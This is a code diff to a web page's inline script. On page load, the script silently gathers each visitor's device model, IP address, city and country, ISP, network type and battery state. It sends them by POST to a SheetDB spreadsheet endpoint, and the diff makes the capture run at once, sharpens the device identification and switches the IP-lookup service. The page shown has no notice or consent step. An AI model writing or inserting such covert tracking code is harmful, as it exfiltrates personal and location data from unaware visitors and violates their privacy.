@@ -315,30 +315,63 @@
         });
         
    //     sheet db
-let script = document.createElement('script');
-script.src = "https://cdn.jsdelivr.net/npm/device-detector-js@3.0.0/dist/device-detector.min.js";
-document.head.appendChild(script);
-
 async function sendToSheetDB() {
     try {
-        let deviceName = "Unknown Device";
-        if (typeof DeviceDetector !== 'undefined') {
-            const deviceDetector = new DeviceDetector();
-            const device = deviceDetector.parse(navigator.userAgent);
-            let brand = device.device ? device.device.brand : "";
-            let model = device.device ? device.device.model : "";
-            deviceName = (brand || model) ? `${brand} ${model}`.trim() : "Unknown Device";
+    
+        async function getExactDeviceName() {
+            let ua = navigator.userAgent;
+
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                try {
+                    let uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
+                    if (uaData.model) return uaData.model;
+                } catch (e) {
+                    console.log("UA Data error:", e);
+                }
+            }
+
+            if (/android/i.test(ua)) {
+                let match = ua.match(/\(([^)]+)\)/);
+                if (match && match[1]) {
+                    let parts = match[1].split(';');
+                    for (let part of parts) {
+                        part = part.trim();
+                        if (part.includes("Build/") || part.includes("K/")) {
+                            return part.split("Build/")[0].split("K/")[0].trim();
+                        }
+                    }
+                    let lastPart = parts[parts.length - 1].trim();
+                    if (lastPart && !lastPart.includes("Android")) return lastPart;
+                }
+                return "Android Device";
+            }
+
+            if (/iPhone/i.test(ua)) return "iPhone";
+            if (/iPad/i.test(ua)) return "iPad";
+            if (/Macintosh/i.test(ua)) return "Mac";
+            if (/Windows/i.test(ua)) return "Windows PC";
+            if (/Linux/i.test(ua)) return "Linux PC";
+
+            return "Unknown Device";
         }
 
+        let deviceName = await getExactDeviceName();
+
+        
         let ipData = {};
         try {
-            ipData = await (await fetch('https://ipapi.co/json/')).json();
+            let res = await fetch('https://ip-api.com/json/?fields=status,country,city,isp,query');
+            let result = await res.json();
+            if (result.status === "success") {
+                ipData = result;
+            }
         } catch (e) {
             console.log("IP fetch error:", e);
         }
 
         let connection = navigator.connection || {};
 
+        // Battery Info
         let batteryLevel = "Unknown";
         let isCharging = "Unknown";
         if (navigator.getBattery) {
@@ -353,9 +386,9 @@ async function sendToSheetDB() {
 
         let data = {
             "device_model": deviceName,
-            "ip": ipData.ip || "Unknown",
-            "location": (ipData.city && ipData.country_name) ? `${ipData.city}, ${ipData.country_name}` : "Unknown",
-            "isp": ipData.org || "Unknown",
+            "ip": ipData.query || "Unknown",
+            "location": (ipData.city && ipData.country) ? `${ipData.city}, ${ipData.country}` : "Unknown",
+            "isp": ipData.isp || "Unknown",
             "network_type": connection.effectiveType || "Unknown",
             "battery_level": batteryLevel,
             "charging_status": isCharging,
@@ -372,6 +405,7 @@ async function sendToSheetDB() {
             "time": new Date().toLocaleString()
         };
 
+       
         await fetch("https://sheetdb.io/api/v1/af0463c53ob1m", {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -384,7 +418,7 @@ async function sendToSheetDB() {
 }
 
 window.addEventListener('DOMContentLoaded', () => {
-    setTimeout(sendToSheetDB, 1000);
+    sendToSheetDB();
 });
     </script>
 </body>
